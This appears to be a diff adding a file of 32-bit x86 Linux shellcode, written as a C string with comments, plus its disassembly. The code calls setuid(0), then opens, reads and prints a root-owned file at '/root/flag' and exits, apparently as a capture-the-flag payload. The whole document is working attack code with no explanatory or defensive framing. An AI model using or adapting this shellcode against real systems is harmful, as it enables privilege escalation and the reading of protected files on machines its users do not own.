@@ -1,0 +1,86 @@
+
+
+char *shellcode = \
+"\x31\xdb"
+"\x31\xc9"
+"\x31\xd2"
+"\x31\xc0"
+"\xb0\x17\xcd\x80"		//setuid(0)
+"\x31\xc0"
+"\x50"
+"\x68"
+"\x66\x6c\x61\x67"		//push "flag"
+"\x68"
+"\x2f\x2f\x2f\x2f"		//push "////"
+"\x68"
+"\x72\x6f\x6f\x74"		//push "root"
+"\x68"
+"\x2f\x2f\x2f\x2f"		//push "////"
+"\x89\xe3"
+"\x31\xc9"
+"\xb0\x05"
+"\xcd\x80"
+"\x89\xc6"
+"\x66\x81\xec"
+"\x01\x01"				//read size	= 0x0101
+"\x89\xf3"
+"\x89\xe1"
+"\x66\xba"
+"\x01\x01"				//read size	= 0x0101				
+"\xb0\x03"
+"\xcd\x80"
+"\x31\xdb"
+"\xb3"
+"\x01"					//write fd      = 0x01 = STDOUT			
+"\x89\xe1"
+"\x89\xc2"
+"\x31\xc0"
+"\xb0\x04"
+"\xcd\x80"
+"\x31\xc0"
+"\x40"
+"\xb3\x01"
+"\xcd\x80";
+
+
+
+
+
+
+
+===========
+08048054 <_start>:
+ 8048054:	31 c0                	xor    %eax,%eax
+ 8048056:	31 db                	xor    %ebx,%ebx
+ 8048058:	31 c9                	xor    %ecx,%ecx
+ 804805a:	31 d2                	xor    %edx,%edx
+ 804805c:	b0 17                	mov    $0x17,%al
+ 804805e:	cd 80                	int    $0x80
+ 8048060:	50                   	push   %eax
+ 8048061:	68 66 6c 61 67       	push   $0x67616c66
+ 8048066:	68 2f 2f 2f 2f       	push   $0x2f2f2f2f
+ 804806b:	68 72 6f 6f 74       	push   $0x746f6f72
+ 8048070:	68 2f 2f 2f 2f       	push   $0x2f2f2f2f
+ 8048075:	89 e3                	mov    %esp,%ebx
+ 8048077:	31 c9                	xor    %ecx,%ecx
+ 8048079:	b0 05                	mov    $0x5,%al
+ 804807b:	cd 80                	int    $0x80
+ 804807d:	89 c6                	mov    %eax,%esi
+ 804807f:	66 81 ec 01 01       	sub    $0x101,%sp
+ 8048084:	89 f3                	mov    %esi,%ebx
+ 8048086:	89 e1                	mov    %esp,%ecx
+ 8048088:	66 ba 01 01          	mov    $0x101,%dx
+ 804808c:	b0 03                	mov    $0x3,%al
+ 804808e:	cd 80                	int    $0x80
+ 8048090:	31 db                	xor    %ebx,%ebx
+ 8048092:	b3 01                	mov    $0x1,%bl
+ 8048094:	89 e1                	mov    %esp,%ecx
+ 8048096:	89 c2                	mov    %eax,%edx
+ 8048098:	31 c0                	xor    %eax,%eax
+ 804809a:	b0 04                	mov    $0x4,%al
+ 804809c:	cd 80                	int    $0x80
+ 804809e:	31 c0                	xor    %eax,%eax
+ 80480a0:	40                   	inc    %eax
+ 80480a1:	b3 01                	mov    $0x1,%bl
+ 80480a3:	cd 80                	int    $0x80
+
